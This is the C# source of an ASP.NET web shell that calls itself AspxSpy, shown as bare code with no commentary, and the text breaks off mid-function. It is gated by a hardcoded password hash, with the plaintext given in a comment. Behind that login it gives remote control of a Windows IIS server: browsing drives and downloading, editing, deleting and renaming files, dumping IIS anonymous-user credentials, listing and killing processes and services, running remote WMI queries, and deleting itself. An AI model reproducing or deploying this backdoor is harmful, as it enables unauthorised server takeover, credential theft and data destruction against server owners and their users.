<%@ Page Language="C#" Debug="false" trace="false" validateRequest="false" EnableViewStateMac="false" EnableViewState="true"%>
<%@ import Namespace="System.IO"%>
<%@ import Namespace="System.IO.Compression"%>
<%@ import Namespace="System.Diagnostics"%>
<%@ import Namespace="System.Data"%>
<%@ import Namespace="System.Data.OleDb"%>
<%@ import Namespace="System.Data.Common"%>
<%@ Import Namespace="System.Data.SqlClient"%>
<%@ import Namespace="System.Management"%>
<%@ import Namespace="Microsoft.Win32"%>
<%@ import Namespace="System.Net" %>
<%@ import Namespace="System.Net.Sockets" %>
<%@ import Namespace="System.Reflection"%>
<%@ import Namespace="System.Runtime.InteropServices"%>
<%@ import Namespace="System.DirectoryServices"%>
<%@ import Namespace="System.ServiceProcess"%>
<%@ import Namespace="System.Text.RegularExpressions"%>
<%@ Import Namespace="System.Security"%>
<%@ Import Namespace="System.Security.Permissions"%>
<%@ Import Namespace="System.Threading"%>
<%@ Assembly Name="System.DirectoryServices,Version=2.0.0.0,Culture=neutral,PublicKeyToken=B03F5F7F11D50A3A"%>
<%@ Assembly Name="System.Management,Version=2.0.0.0,Culture=neutral,PublicKeyToken=B03F5F7F11D50A3A"%>
<%@ Assembly Name="System.ServiceProcess,Version=2.0.0.0,Culture=neutral,PublicKeyToken=B03F5F7F11D50A3A"%>
<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<script runat="server">



	public const string Version="2022Gro";
	public const string Password="0bdd128874d07ed21b7e3d5c9a27e2df"; //     PWD:hh1234@
	private const string dmnusrname="admin";
	private const string PMCacheName=Version+"PMList";
	private int CssC=1;
	private DbConnection conn=null;
	private DbCommand comm=null;
	protected void Page_Load(object sender,EventArgs e)
	{
		JscriptSender(this);
		if (!chckLogin()){return;}
		if(IsPostBack)
		{
			zcg_GetDriver();
			zcg_SetHeaderInfo();
      string Bin_Target=Request["__EVENTTARGET"];
			string bnPth=Request["__File"];
			if(Bin_Target!="")
			{try{
				switch(Bin_Target)
				{
					case "blstdir":
						FleBnn(B64mec(bnPth));
						break;
					case "oedelpath":
						oedelpath(B64mec(bnPth));
						break;
					case "BonCreateF":
						BonCreateF(bnPth);
						break;
					case "bedtfil":
						BonCreateF(bnPth);
						break;
					case "bndircrr":
						bndircrr(bnPth);
						break;
					case "bnclnett":
						bnclnett(bnPth);
						break;
					case "bonDEK":
						bonDEK(B64mec(bnPth));
						break;
					case "bnDf":
						bnDf(bnPth);
						break;
					case "bnRggread":
						Bin_ShowReg(B64mec(bnPth));
						break;
					case "bkilME":
						bkilME();
						break;
					case "klaxwi":
						klaxwi(bnPth);
						break;
					case "zcg_ListADS":
						euhAllezlwRE.Value=B64mec(bnPth);
						lkesLKEveeD(B64mec(bnPth),ztxbED.Value,euhAllezlwa.Value,euhtaquoistpS.Value);
						break;
					case "pazelVS":
						pazelVS(B64mec(bnPth));
						break;
				}
				if(Bin_Target.StartsWith("zcg_Rename"))
				{
					zcg_Rename(B64mec(Bin_Target.Replace("zcg_Rename","")),bnPth);
				}
				else if(Bin_Target.StartsWith("copfille"))
				{
					Bin_CopyFile(B64mec(Bin_Target.Replace("copfille","")),bnPth);
				}
			}catch(Exception ex){ee_ShowErr(ex);}}
		}
		else
		{Bin_Main();}
	}
	void IHttpHandler.ProcessRequest(HttpContext context)
	{
		try{base.ProcessRequest(context);}
		catch(SecurityException ex){context.Response.Clear();context.Response.Write("AspxSpy request low-trust minimum,Exception message: "+ex.Message);}
		catch(Exception ex){context.Response.Write(String.Format("Unhandled exception: {0} <pre><xmp>\r\nmessage:\r\n {1} \r\ntrace:\r\n {2} \r\n string:\r\n {3}</xmp></pre>",ex.GetType(),ex.Message,ex.StackTrace,ex));}
	}
    private void Hide_Div()
    {
        Bin_Div_Process.Visible = false;
        Bin_Div_File.Visible = false;
        Bin_Div_Cmd.Visible = false;
        zemfosdfml.Visible = false;
        zemfokeUQ.Visible = false;
        Bin_Div_Data.Visible = false;
        zemfokemM.Visible = false;
        Bin_Div_Edit.Visible = false;
        Bin_Div_Search.Visible = false;
        Bin_Div_WmiTools.Visible = false;
		euhAllezlwVOU.Visible=false;
		zcg_div_Plugin.Visible=false;
    }
	private bool chckLogin()
	{
		if(Request.Cookies[Version]==null)
		{
			BEINLOG();
			return false;
		}
		else
		{
			if (Request.Cookies[Version].Value!=Password)
			{
				BEINLOG();
				return false;
			}
			else
			{
				return true;
			}
		}
	}
	private void BEINLOG()
	{
		Bin_Div_Login.Visible=true;
		Bin_Div_Content.Visible=false;
	}
	protected void Bin_Button_Logout_Click(object sender,EventArgs e)
	{
		Session.Abandon();
		Response.Cookies.Add(new HttpCookie(Version,null));
		BEINLOG();
	}
	private void Bin_Main()
	{
		zcg_SetHeaderInfo();
		zcg_GetDriver();
		if (Bin_TextBox_Path.Value=="")
		{			
			Bin_TextBox_Path.Value=bnPthBuild(Server.MapPath("."));
		}
		FleBnn(Bin_TextBox_Path.Value);
	}
	private void zcg_SetHeaderInfo()
	{
		Bin_Div_Content.Visible=true;
		Bin_Div_Login.Visible=false;
		Bin_Button_CreateFile.Attributes["onClick"]="var filename=prompt('Please input file name:','');if(filename){Bin_PostBack('BonCreateF',filename);}";
		Bin_Button_CreateDir.Attributes["onClick"]="var filename=prompt('Please input directory name:','');if(filename){Bin_PostBack('bndircrr',filename);}";
		Bin_Button_KillMe.Attributes["onClick"]="if(confirm('Are you sure delete ASPXSPY?')){Bin_PostBack('bkilME','');};";
		Bin_Span_Sname.InnerHtml=Request.ServerVariables["LOCAL_ADDR"]+":"+Request.ServerVariables["SERVER_PORT"]+"("+Request.ServerVariables["SERVER_NAME"]+")"+zcg_CheckPermission();
		Bin_Span_FrameVersion.InnerHtml="Framework Ver : "+Environment.Version.ToString();
	}
	private string zcg_CheckPermission()
	{
		string s="&nbsp;&nbsp;Host Trust Level:&nbsp;&nbsp;<span style='color:red;'>{0}</span>&nbsp;&nbsp;IsFull-Trust:&nbsp;&nbsp;<span style='color:red;'>{1}</span>&nbsp;&nbsp;User:&nbsp&nbsp;<span style='color:red;'>{2}</span>";
		string u=zcg_GetUserName();
		try{(new PermissionSet(PermissionState.Unrestricted)).Demand();return string.Format(s,GetTrustLevel(),true,u);}
		catch{return string.Format(s,GetTrustLevel(),false,u);}
	}
	private string zcg_GetUserName()
	{
		try{return System.Security.Principal.WindowsIdentity.GetCurrent().Name;}catch{return "Unknown -- No permission";}
	}
	private string GetTrustLevel()
	{
		try{new AspNetHostingPermission(AspNetHostingPermissionLevel.Unrestricted).Demand();return "Full";}catch{}
		try{new AspNetHostingPermission(AspNetHostingPermissionLevel.High).Demand();return "High";}catch{}
		try{new AspNetHostingPermission(AspNetHostingPermissionLevel.Medium).Demand();return "Medium";}catch{}
		try{new AspNetHostingPermission(AspNetHostingPermissionLevel.Low).Demand();return "Low";}catch{}
		try{new AspNetHostingPermission(AspNetHostingPermissionLevel.Minimal).Demand();return "Minimal";}catch{}
		try{new AspNetHostingPermission(AspNetHostingPermissionLevel.None).Demand();return "None";}catch{}
		return "Unknown";
	}
	private void zcg_GetDriver()
	{
		string[] drivers=null;
		try{drivers=Directory.GetLogicalDrives();}
		catch{string drs="";
			for(int i=0x41;i<0x5b;i++)
			{
				string ds=new string((new char[]{(char)i,':','\\'}));
				try
				{
					DriveInfo di=new DriveInfo(ds);
					if(di.DriveType!=DriveType.NoRootDirectory){drs+=ds+"|";}
				}catch{}
				finally{drivers=drs.Split(new char[]{'|'},(StringSplitOptions)1);}
			}}
		Bin_Span_Drv.InnerHtml="";
		for(int i=0;i<drivers.Length;i++)
		{
			Bin_Span_Drv.InnerHtml+=String.Format("<a href=\"javascript:Bin_PostBack('blstdir','{0}')\">{1}</a> | ",Bin_ToBase64(drivers[i]),neLLbuil(drivers[i]));
		}
	}
	private string bnPthBuild(string path)
	{
		if(!path.EndsWith(@"\")){path+=@"\";}return path;
	}
	private string neLLbuil(string instr)
	{
		DriveInfo di=new DriveInfo(instr);
		return String.Format("{0}({1}:)",di.DriveType,instr[0]);
	}
	private string Bin_ToBase64(string instr)
	{
		byte[] tmp=Encoding.UTF8.GetBytes(instr);
		return Convert.ToBase64String(tmp);
	}
	private string B64mec(string instr)
	{
		byte[] tmp=Convert.FromBase64String(instr);
		return Encoding.UTF8.GetString(tmp);
	}
	private TableRow efefskdKK()
	{
		TableRow tr=new TableRow();
		fdsCtrll(tr);
		return tr;
	}
	private void fdsCtrll(WebControl ctl)
	{
		string bg=bneCSE();
		ctl.Attributes["onmouseover"]="this.className='focus';";
		ctl.CssClass=bg;
		ctl.Attributes["onmouseout"]="this.className='"+bg+"';";
	}
	private void FleBnn(string path)
	{
		try{
		Hide_Div();
		Bin_Div_File.Visible=true;
		Bin_H2_Title.InnerText="File Manager >>";
		Bin_TextBox_Path.Value=bnPthBuild(path);
		path=(path.EndsWith("\\")&&(!path.EndsWith(":\\")))?path.TrimEnd('\\'):path;
		DirectoryInfo Bin_dir=new DirectoryInfo(path);
		try{
		if(Directory.GetParent(path)!=null)
		{
			TableRow p=efefskdKK();
			for(int i=1;i<6;i++)
			{
				TableCell pc=new TableCell();
				if(i==1)
				{
					pc.Width=Unit.Parse("2%");
					pc.Text="0";
				}
				if(i==2)
				{
					pc.Text="<a href=\"javascript:Bin_PostBack('blstdir','"+Bin_ToBase64(Directory.GetParent(path).ToString())+"')\">Parent Directory</a>";
				}
				p.Cells.Add(pc);
				Bin_Table_File.Rows.Add(p);
			}
		}}catch{}
		try
		{
			int dir_c=0;
			foreach(DirectoryInfo Bin_folder in Bin_dir.GetDirectories())
			{
				dir_c++;
				TableCell tc=new TableCell();
				tc.Width=Unit.Parse("2%");
				tc.Text="0";
				TableRow tr=efefskdKK();
				tr.Cells.Add(tc);
				TableCell dirname=new TableCell();
				dirname.Text="<a href=\"javascript:Bin_PostBack('blstdir','"+Bin_ToBase64(Bin_TextBox_Path.Value+Bin_folder.Name)+"')\">"+Bin_folder.Name+"</a>";
				tr.Cells.Add(dirname);
				TableCell dirtime=new TableCell();
				dirtime.Text=Bin_folder.LastWriteTimeUtc.ToString("yyyy-MM-dd hh:mm:ss");
				tr.Cells.Add(dirtime);
				Bin_Table_File.Rows.Add(tr);
				TableCell dirsize=new TableCell();
				dirsize.Text="--";
				tr.Cells.Add(dirsize);
				Bin_Table_File.Rows.Add(tr);
				TableCell diraction=new TableCell();
				diraction.Text="<a href=\"javascript:if(confirm('Are you sure will delete it ?\\n\\nIf non-empty directory,will be delete all the files.')){Bin_PostBack('oedelpath','"+Bin_ToBase64(Bin_TextBox_Path.Value+Bin_folder.Name)+"')};\">Del</a> | <a href='#' onclick=\"var filename=prompt('Please input the new folder name:','"+Bin_folder.Name.Replace("'","\\'")+"');if(filename){Bin_PostBack('zcg_Rename"+Bin_ToBase64(Bin_TextBox_Path.Value+Bin_folder.Name)+"',filename);} \">Rename</a>";
				tr.Cells.Add(diraction);
				Bin_Table_File.Rows.Add(tr);
			}
			TableRow intr=new TableRow();
			intr.Attributes["style"]="border-top:1px solid #fff;border-bottom:1px solid #ddd;";
			intr.Attributes["bgcolor"]="#dddddd";
			TableCell intc=new TableCell();
			intc.Attributes["colspan"]="6" ;
			intc.Attributes["height"]="5";
			intr.Cells.Add(intc);
			Bin_Table_File.Rows.Add(intr);
			int file_c=0;
			foreach(FileInfo FleBnns in Bin_dir.GetFiles())
			{
				file_c++;
				TableRow tr=efefskdKK();
				TableCell tc=new TableCell();
				tc.Width=Unit.Parse("2%");
				tc.Text="<input type=\"checkbox\" value=\"0\" name=\""+Bin_ToBase64(FleBnns.Name)+"\">";
				tr.Cells.Add(tc);
				TableCell filename=new TableCell();
				if(FleBnns.FullName.StartsWith(Request.PhysicalApplicationPath))
				{
					string url=Request.Url.ToString();
					filename.Text="<a href=\""+FleBnns.FullName.Replace(Request.PhysicalApplicationPath,url.Substring(0,url.IndexOf('/',8)+1)).Replace("\\","/")+"\" target=\"_blank\">"+FleBnns.Name+"</a>";
				}
				else
				{
					filename.Text=FleBnns.Name;
				}
				TableCell filetime=new TableCell();
				filetime.Text=FleBnns.LastWriteTimeUtc.ToString("yyyy-MM-dd hh:mm:ss");
				TableCell filesize=new TableCell();
				filesize.Text=FleBnnSize(FleBnns.Length);
				TableCell action=new TableCell();
				action.Text="<a href=\"#\" onclick=\"Bin_PostBack('bonDEK','"+Bin_ToBase64(Bin_TextBox_Path.Value+FleBnns.Name)+"')\">Down</a> | <a href='#' onclick=\"var filename=prompt('Please input the new path(full path):','"+Bin_TextBox_Path.Value.Replace(@"\",@"\\")+FleBnns.Name.Replace("'","\\'")+"');if(filename){Bin_PostBack('copfille"+Bin_ToBase64(Bin_TextBox_Path.Value+FleBnns.Name)+"',filename);} \">Copy</a> | <a href=\"#\" onclick=\"Bin_PostBack('bedtfil','"+FleBnns.Name+"')\">Edit</a> | <a href='#' onclick=\"var filename=prompt('Please input the new file name(full path):','"+FleBnns.Name.Replace("'","\\'")+"');if(filename){Bin_PostBack('zcg_Rename"+Bin_ToBase64(Bin_TextBox_Path.Value+FleBnns.Name)+"',filename);} \">Rename</a> | <a href=\"#\" onclick=\"Bin_PostBack('bnclnett','"+FleBnns.Name+"')\">Time</a> ";
				tr.Cells.Add(filename);
				tr.Cells.Add(filetime);
				tr.Cells.Add(filesize);
				tr.Cells.Add(action);
				Bin_Table_File.Rows.Add(tr);
			}
			TableRow cktr=efefskdKK();
			for(int i=1;i<4;i++)
			{
				TableCell cktd=new TableCell();
				if(i==1)
				{
					cktd.Text="<input name=\"chkall\" value=\"on\" type=\"checkbox\" onclick=\"var ck=document.getElementsByTagName('input');for(var i=0;i<ck.length-1;i++){if(ck[i].type=='checkbox'&&ck[i].name!='chkall'){ck[i].checked=forms[0].chkall.checked;}}\"/>";
				}
				if(i==2)
				{
					cktd.Text="<a href=\"#\" Onclick=\"var d_file='';var ck=document.getElementsByTagName('input');for(var i=0;i<ck.length-1;i++){if(ck[i].checked&&ck[i].name!='chkall'){d_file+=ck[i].name+',';}};if(d_file==null || d_file==''){ return;} else {if(confirm('Are you sure delete the files ?')){Bin_PostBack('bnDf',d_file)};}\">Delete selected</a>";
				}
				if(i==3)
				{
					cktd.ColumnSpan=4;
					cktd.Style.Add("text-align","right");
					cktd.Text=dir_c+" directories/ "+file_c+" files";
				}
				cktr.Cells.Add(cktd);
			}
			Bin_Table_File.Rows.Add(cktr);
		}
		catch(Exception err)
		{
			ee_ShowErr(err);
		}}catch(Exception ex){ee_ShowErr(ex);}
	}
	private string bneCSE()
	{
		CssC++;
		if(CssC % 2==0)
		{
			return "alt1";
		}
		else
		{
			return "alt2";
		}
	}
	private void oedelpath(string dirstr)
	{
		try
		{
			Directory.Delete(dirstr,true);
			bnMsgg("Directory delete success !");
		}
		catch(Exception error)
		{
			ee_ShowErr(error);
		}
		FleBnn(Directory.GetParent(dirstr).ToString());
	}
	private void zcg_Rename(string source,string dire)
	{
		try
		{
			dire=Path.Combine(Bin_TextBox_Path.Value,dire);
			Directory.Move(source,dire);
			bnMsgg("Rename Success !");
		}
		catch(Exception error)
		{
			bnMsgg(error.Message);
		}
		FleBnn(Bin_TextBox_Path.Value);
	}
	private void Bin_CopyFile(string spath,string dpath)
	{
		try
		{
			File.Copy(spath,dpath);
			bnMsgg("File Copy Success !");
		}
		catch(Exception error)
		{
			ee_ShowErr(error);
		}
		FleBnn(Bin_TextBox_Path.Value);
	}
	private void bndircrr(string path)
	{
		try
		{
			Directory.CreateDirectory(Bin_TextBox_Path.Value+path);
			bnMsgg("Directory created success !");
		}
		catch(Exception error)
		{
			ee_ShowErr(error);
		}
		FleBnn(Bin_TextBox_Path.Value);
	}
	private void BonCreateF(string path)
	{
		if(Request["__EVENTTARGET"]=="bedtfil" || Request["__EVENTTARGET"]=="BonCreateF")
		{
			foreach(ListItem item in Bin_List_Code.Items)
			{
				if(item.Selected)
				{
					item.Selected=false;
				}
			}
		}
		Bin_H2_Title.InnerText="Create/ Edit File >>";
		Hide_Div();
		Bin_Div_Edit.Visible=true;
		if(path.IndexOf(":")< 0)
		{
			Bin_TextBox_Fp.Value=Bin_TextBox_Path.Value+path;
		}
		else
		{
			Bin_TextBox_Fp.Value=path;
		}
		if(File.Exists(Bin_TextBox_Fp.Value))
		{
			StreamReader sr;
			if(Bin_List_Code.SelectedItem.Text=="UTF-8")
			{
				sr=new StreamReader(Bin_TextBox_Fp.Value,Encoding.UTF8);
			}
			else
			{
				sr=new StreamReader(Bin_TextBox_Fp.Value,Encoding.Default);
			}
			Bin_Textarea_Edit.InnerText=sr.ReadToEnd();
			sr.Close();
		}
		else
		{
			Bin_Textarea_Edit.InnerText="";
		}
	}
	private void bonDEK(string path)
	{
		FileStream fs=null;
		byte[] buffer=new byte[0x1000];
		int count=0;
		try{
		FileInfo fi=new FileInfo(path);
		fs=fi.OpenRead();
		Response.Clear();
		Response.ClearHeaders();
		Response.Buffer=false;
		this.EnableViewState=false;
		Response.AddHeader("Content-Disposition","attachment;filename="+HttpUtility.UrlEncode(fi.Name,System.Text.Encoding.UTF8));
		Response.AddHeader("Content-Length",fi.Length.ToString());
		Response.ContentType="application/octet-stream";
		count=fs.Read(buffer,0,0x1000);
		while(count>0)
		{
			Response.OutputStream.Write(buffer,0,count);
			Response.Flush();
			count=fs.Read(buffer,0,0x1000);
		}
		Page.Response.Flush();
		Response.End();
		}catch(Exception ex){ee_ShowErr(ex);}
		finally{if(fs!=null){fs.Close();}}
	}
	private void bnDf(string path)
	{
		try
		{
			string[] mydata=path.Split(',');
			for(int i=0;i<mydata.Length-1;i++)
			{
				File.Delete(Bin_TextBox_Path.Value+B64mec(mydata[i]));
			}
			bnMsgg("File Delete Success !");
		}
		catch(Exception error)
		{
			ee_ShowErr(error);
		}
		FleBnn(Bin_TextBox_Path.Value);
	}
	private void bkilME()
	{
		try
		{
			File.Delete(Request.PhysicalPath);
			Response.Redirect("http://www.google.com");
		}
		catch(Exception error)
		{
			ee_ShowErr(error);
		}
	}
	private void bnclnett(string path)
	{
		
		try{
		path=Path.Combine(Bin_TextBox_Path.Value,path);
		Bin_TextBox_Sp.Value=path;
		Bin_TextBox_Dp.Value=Bin_TextBox_Path.Value;
		Bin_TextBox_Sp1.Value=path;
		string Att=File.GetAttributes(Bin_TextBox_Sp.Value).ToString();
		Bin_H2_Title.InnerText="Clone file was last modified time >>";
		Hide_Div();
		Bin_Div_Time.Visible=true;
		if(Att.LastIndexOf("ReadOnly")!=-1)
		{
			Bin_CheckBox_ReadOnly.Checked=true;
		}
		if(Att.LastIndexOf("System")!=-1)
		{
			Bin_CheckBox_System.Checked=true;
		}
		if(Att.LastIndexOf("Hidden")!=-1)
		{
			Bin_CheckBox_Hiddent.Checked=true;
		}
		if(Att.LastIndexOf("Archive")!=-1)
		{
			Bin_CheckBox_Archive.Checked=true;
		}
		Bin_TextBox_Creation.Value=File.GetCreationTimeUtc(Bin_TextBox_Sp1.Value).ToString();
		Bin_TextBox_LastWrite.Value=File.GetLastWriteTimeUtc(Bin_TextBox_Sp1.Value).ToString();
		Bin_TextBox_LastAccess.Value=File.GetLastAccessTimeUtc(Bin_TextBox_Sp1.Value).ToString();
		}catch(Exception ex){ee_ShowErr(ex);}
	}
	private String FleBnnSize(Int64 fileSize)
	{
		if(fileSize<0)
		{
			throw new ArgumentOutOfRangeException("fileSize");
		}
		else if(fileSize >= 1024 * 1024 * 1024)
		{
			return string.Format("{0:########0.00} G",((Double)fileSize)/(1024 * 1024 * 1024));
		}
		else if(fileSize >= 1024 * 1024)
		{
			return string.Format("{0:####0.00} M",((Double)fileSize)/(1024 * 1024));
		}
		else if(fileSize >= 1024)
		{
			return string.Format("{0:####0.00} K",((Double)fileSize)/ 1024);
		}
		else
		{
			return string.Format("{0} B",fileSize);
		}
	}
	private void bnSpEE()
	{
		string issstr="IIS://localhost/W3SVC";
		DirectoryEntry mydir=new DirectoryEntry(issstr);
		foreach(DirectoryEntry child in mydir.Children)
		{
			int tmpi=0;
			if(Int32.TryParse(child.Name.ToString(),out tmpi))
			{
				DirectoryEntry newdir=new DirectoryEntry(issstr+"/"+child.Name.ToString());
				DirectoryEntry dirmsg=newdir.Children.Find("root","IIsWebVirtualDir");
				TableRow TR=efefskdKK();
				TR.Attributes["title"]="Site:"+child.Properties["ServerComment"].Value.ToString();
				for(int i=1;i<6;i++)
				{
					try
					{
						TableCell TC_USER=new TableCell();
						switch(i)
						{	case 1:
								TC_USER.Text=tmpi.ToString();
								break;
							case 2:
								TC_USER.Text=dirmsg.Properties["AnonymousUserName"].Value.ToString();
								break;
							case 3:
								TC_USER.Text=dirmsg.Properties["AnonymousUserPass"].Value.ToString();
								break;
							case 4:
								StringBuilder sb=new StringBuilder();
								PropertyValueCollection pc=child.Properties["ServerBindings"];
								for (int j=0; j < pc.Count; j++)
								{
									sb.Append(pc[j].ToString()+"<br>");
								}
								TC_USER.Text=sb.ToString().Substring(0,sb.ToString().Length-4);
								break;
							case 5:
								TC_USER.Text="<a href=\"javascript:Bin_PostBack('blstdir','"+Bin_ToBase64(dirmsg.Properties["Path"].Value.ToString())+"')\">"+dirmsg.Properties["Path"].Value.ToString()+"</a>";
								break;
						}
						TR.Cells.Add(TC_USER);
					}
					catch{continue;}
				}
				ETable_Sp.Controls.Add(TR);
			}
		}
	}
	private void klaseee()
	{
		Regex re=new Regex(@"W3SVC\/(\d+)\/",RegexOptions.IgnoreCase);
		ManagementScope wmiscope=new ManagementScope(@"\\.\root\MicrosoftIISv2");
		wmiscope.Connect();
		ObjectQuery wmiquery=new ObjectQuery("SELECT * FROM IISWebVirtualDirSetting");
		ManagementObjectSearcher wmisearcher=new ManagementObjectSearcher(wmiscope,wmiquery);
		ManagementObjectCollection querycoll=wmisearcher.Get();
		foreach(ManagementObject objmanage in querycoll)
		{
			string siteid=re.Matches(objmanage["Name"].ToString())[0].Groups[1].Value;
			TableRow TR=efefskdKK();
			for(int i=1;i<6;i++)
			{
				try
				{
					TableCell TC_USER=new TableCell();
					switch (i)
					{
						case 1:
							TC_USER.Text=siteid;
							break;
						case 2:
							TC_USER.Text=objmanage["AnonymousUserName"].ToString();
							break;
						case 3:
							TC_USER.Text=objmanage["AnonymousUserPass"].ToString();
							break;
						case 4:
							wmiquery=new ObjectQuery("SELECT * from IISWebServerSetting where Name='W3SVC/"+siteid+"'");
							wmisearcher=new ManagementObjectSearcher(wmiscope,wmiquery);
							ManagementObjectCollection svrcoll=wmisearcher.Get();
							foreach(ManagementObject objsvr in svrcoll)
							{
								StringBuilder sb=new StringBuilder();
								TR.Attributes["title"]="Site:"+objsvr["ServerComment"];
								foreach(ManagementBaseObject objbind in (ManagementBaseObject[])objsvr["ServerBindings"])
								{
									sb.Append(objbind["IP"].ToString()+":"+objbind["Port"].ToString()+":"+objbind["Hostname"].ToString()+"<br>");
								}
								TC_USER.Text=sb.ToString().Substring(0,sb.ToString().Length-4);
							}
							break;
						case 5:
							TC_USER.Text="<a href=\"javascript:Bin_PostBack('blstdir','"+Bin_ToBase64(objmanage["Path"].ToString())+"')\">"+objmanage["Path"].ToString()+"</a>";
							break;
					}
					TR.Cells.Add(TC_USER);
				}
				catch{continue;}
			}
			ETable_Sp.Controls.Add(TR);
		}
	}
	private ManagementObjectCollection Bin_WmiQuery(string @namespace,string query)
	{
		ManagementObjectSearcher QS=new ManagementObjectSearcher(@namespace,query);
		return QS.Get();
	}
	private DataTable zcg_WmiDataTable(string @namespace,string query)
	{
		ManagementObjectSearcher QS=new ManagementObjectSearcher(@namespace,query);
		return zcg_WmiSearcherToDataTable(QS);
	}
	private DataTable zcg_WmiDataTable(string computer,string username,string password,string @namespace,string query)
	{
		ConnectionOptions connection = new ConnectionOptions();
		string domain=(username.IndexOf("\\")>0)?(username.Split('\\')[0]):"";
        connection.Username = (username.IndexOf("\\")>0)?(username.Split('\\')[1]):username;
        connection.Password = password;
        connection.Authority = "ntlmdomain:"+domain;
        ManagementScope scope = new ManagementScope("\\\\"+computer+"\\"+@namespace, connection);
        scope.Connect();
        ObjectQuery objquery= new ObjectQuery(query); 
        ManagementObjectSearcher QS = new ManagementObjectSearcher(scope, objquery);
		return zcg_WmiSearcherToDataTable(QS);
	}
	private DataTable zcg_WmiSearcherToDataTable(ManagementObjectSearcher QS)
	{
		DataTable dt=new DataTable();
		foreach(ManagementObject m in QS.Get())
		{
			DataRow dr=dt.NewRow();
			PropertyDataCollection.PropertyDataEnumerator oEnum;
			oEnum=(m.Properties.GetEnumerator()as PropertyDataCollection.PropertyDataEnumerator);
			while(oEnum.MoveNext())
			{
				PropertyData prop=(PropertyData)oEnum.Current;
				if(dt.Columns.IndexOf(prop.Name)==-1)
				{
					dt.Columns.Add(prop.Name);
					dt.Columns[dt.Columns.Count-1].DefaultValue="";
				}
				if(m[prop.Name]!=null)
				{
					dr[prop.Name]=m[prop.Name].ToString();
				}
				else
				{
					dr[prop.Name]="";
				}
			}
			dt.Rows.Add(dr);
		}
		return dt;
	}
	private void GtProcss()
	{
		int pcount=0;
		Process[] p=Process.GetProcesses();
		foreach(Process sp in p)
		{
			pcount++;
			TableRow tr=efefskdKK();
			for(int i=1;i<7;i++)
			{
				TableCell td=new TableCell();
				if(i==1)
				{
					td.Width=Unit.Parse("2%");
					td.Text=pcount.ToString();
					tr.Controls.Add(td);
				}
				if(i==2)
				{
					td.Text=sp.Id.ToString();
					tr.Controls.Add(td);
				}
				if(i==3)
				{
					td.Text=sp.ProcessName.ToString();
					tr.Controls.Add(td);
				}
				if(i==4)
				{
					td.Text=sp.Threads.Count.ToString();
					tr.Controls.Add(td);
				}
				if(i==5)
				{
					td.Text=sp.BasePriority.ToString();
					tr.Controls.Add(td);
				}
				if(i==6)
				{
					td.Text=mEiProcc(sp.Id);
					tr.Controls.Add(td);
				}
			}
			Bin_Table_Process.Controls.Add(tr);
		}
	}
	private void KiProccsse()
	{
		int pcount=0;
		DataTable dt=zcg_WmiDataTable("root\\CIMV2","select * from Win32_Process");
		for(int j=0;j<dt.Rows.Count;j++)
		{
			pcount++;
			TableRow tr=efefskdKK();
			for(int i=1;i<7;i++)
			{
				TableCell td=new TableCell();
				if(i==1)
				{
					td.Width=Unit.Parse("2%");
					td.Text=pcount.ToString();
					tr.Controls.Add(td);
				}
				if(i==2)
				{
					td.Text=dt.Rows[j]["ProcessID"].ToString();
					tr.Controls.Add(td);
				}
				if(i==3)
				{
					td.Text=dt.Rows[j]["Name"].ToString();
					tr.Controls.Add(td);
				}
				if(i==4)
				{
					td.Text=dt.Rows[j]["ThreadCount"].ToString();
					tr.Controls.Add(td);
				}
				if(i==5)
				{
					td.Text=dt.Rows[j]["Priority"].ToString();
					tr.Controls.Add(td);
				}
				if(i==6)
				{
					td.Text=mEiProcc(dt.Rows[j]["ProcessID"]);
					tr.Controls.Add(td);
				}
			}
			Bin_Table_Process.Controls.Add(tr);
		}
	}
	private string mEiProcc(object pid)
	{
		return string.Format("<a href=\"javascript:Bin_PostBack('klaxwi','{0}')\">Kill</a>",pid);
	}
	private void klaxwi(string pid)
	{
		outsalaE();
		try{zcg_DoKillProcess(pid);bnMsgg("Process Kill Success !");}catch{try{dKilProcE(pid);}catch(Exception ex){ee_ShowErr(ex);}}
		bonebfujkkK(null,null);
	}
	private void zcg_DoKillProcess(string pid)
	{
		Process.GetProcessById(Int32.Parse(pid)).Kill();
	}
	private void dKilProcE(string pid)
	{
		uint i=0;
		foreach(ManagementObject p in Bin_WmiQuery("root\\CIMV2","Select * from Win32_Process Where ProcessID ='"+pid+"'"))
		{
			i=(uint)(p.InvokeMethod("Terminate",null));
			p.Dispose();
		}
		if(i==0){bnMsgg("Process Kill Success !");}
		else{bnMsgg("Kill process error , returned value: "+i);}
	}
	private void gtsrvLoL()
	{
		int pcount=0;
		ServiceController[] objsrv=System.ServiceProcess.ServiceController.GetServices();
		for(int i=0;i<objsrv.Length;i++)
		{
			pcount++;
			TableRow tr=efefskdKK();
			for(int b=1;b<7;b++)
			{
				TableCell td=new TableCell();
				if(b==1)
				{
					td.Width=Unit.Parse("2%");
					td.Text=pcount.ToString();
					tr.Controls.Add(td);
				}
				if(b==2)
				{
					td.Text="null";
					tr.Controls.Add(td);
				}
				if(b==3)
				{
					td.Text=objsrv[i].ServiceName.ToString();
					tr.Controls.Add(td);
				}
				if(b==4)
				{
					td.Text="";
					tr.Controls.Add(td);
				}
				if(b==5)
				{
					string state=objsrv[i].Status.ToString();
					if(state=="Running")
					{
						td.Text="<font color=green>"+state+"</font>";
					}
					else
					{
						td.Text="<font color=red>"+state+"</font>";
					}
					tr.Controls.Add(td);
				}
				if(b==6)
				{
					td.Text="";
					tr.Controls.Add(td);
				}
			}
			Bin_Table_Serviecs.Controls.Add(tr);
		}
	}
	private void gtsrvvmiLoL()
	{
		int pcount=0;
		DataTable dt=zcg_WmiDataTable("root\\CIMV2","select * from Win32_Service");
		for(int j=0;j<dt.Rows.Count;j++)
		{
			pcount++;
			TableRow tr=efefskdKK();
			tr.Attributes["title"]=dt.Rows[j]["Description"].ToString();
			for(int i=1;i<7;i++)
			{
				TableCell td=new TableCell();
				if(i==1)
				{
					td.Width=Unit.Parse("2%");
					td.Text=pcount.ToString();
					tr.Controls.Add(td);
				}
				if(i==2)
				{
					td.Text=dt.Rows[j]["ProcessID"].ToString();
					tr.Controls.Add(td);
				}
				if(i==3)
				{
					td.Text=dt.Rows[j]["Name"].ToString();
					tr.Controls.Add(td);
				}
				if(i==4)
				{
					td.Text=dt.Rows[j]["PathName"].ToString();
					tr.Controls.Add(td);
				}
				if(i==5)
				{
					string state=dt.Rows[j]["State"].ToString();
					if(state=="Running")
					{
						td.Text="<font color=green>"+state+"</font>";
					}
					else
					{
